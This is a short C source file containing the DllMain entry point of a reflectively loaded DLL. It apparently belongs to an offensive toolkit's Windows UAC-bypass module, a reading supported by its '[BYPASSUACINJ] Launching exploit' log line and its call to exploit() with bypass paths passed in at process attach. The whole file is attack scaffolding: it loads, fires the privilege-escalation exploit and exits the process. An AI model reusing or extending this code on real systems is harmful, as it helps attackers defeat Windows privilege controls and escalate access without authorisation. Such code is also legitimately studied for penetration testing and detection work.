#include "ReflectiveLoader.h"
#include "Exploit.h"

extern HINSTANCE hAppInstance;

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
		{
			*(HMODULE *)lpReserved = hAppInstance;
		}
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;

		if (NULL != lpReserved)
		{
			dprintf("[BYPASSUACINJ] Launching exploit with 0x%p", lpReserved);
			exploit((BypassUacPaths*)lpReserved);
		}

		ExitProcess(0);
		break;
	default:
		break;
	}

	return TRUE;

}
